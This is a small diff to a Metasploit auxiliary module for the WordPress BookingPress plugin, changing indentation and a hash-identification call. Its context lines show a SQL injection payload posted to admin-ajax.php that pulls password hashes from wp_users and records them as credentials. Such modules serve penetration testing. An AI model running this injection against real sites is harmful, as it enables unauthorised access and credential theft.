@@ -70,7 +70,7 @@ class MetasploitModule < Msf::Auxiliary
         'method' => 'POST',
         'uri' => normalize_uri('/wp-admin/admin-ajax.php'),
         'vars_post' =>
-                                 generate_vars_post(") UNION ALL SELECT (#{payload}),456,789,12,34,56,78,90,77 from wp_users-- -")
+            generate_vars_post(") UNION ALL SELECT (#{payload}),456,789,12,34,56,78,90,77 from wp_users-- -")
       })
       res.get_json_document[0]['bookingpress_service_id']
     end
@@ -109,7 +109,7 @@ class MetasploitModule < Msf::Auxiliary
         module_fullname: fullname,
         username: username,
         private_type: :nonreplayable_hash,
-        jtr_format: Metasploit::Framework::Hashes.identify_hash(hash),
+        jtr_format: identify_hash(hash),
         private_data: hash,
         service_name: 'WordPress BookingPress Plugin',
         address: datastore['RHOSTS'],
